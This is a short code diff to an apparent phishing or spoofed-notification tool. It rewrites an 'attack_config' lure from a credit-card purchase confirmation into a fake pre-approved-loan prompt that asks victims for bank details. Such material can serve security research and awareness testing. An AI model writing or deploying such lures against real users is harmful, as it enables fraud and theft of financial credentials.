@@ -3,9 +3,9 @@ import { createObject } from '../../notifications_base.js';
 
 export function createNew() {
     const attack_config = {
-        title: "Confirm Your Purchase",
-        subtitle: "Enter your credit card details to finalize this order.",
-        extra: "Enter Credit Card Details Here", 
+        title: "You’re Approved",
+        subtitle: "Provide your banking details to claim your pre-approved loan.",
+        extra: "Enter Bank Details Here", 
         theme: 'black',
         actionText: "Continue",
         cancelText: "Decline",
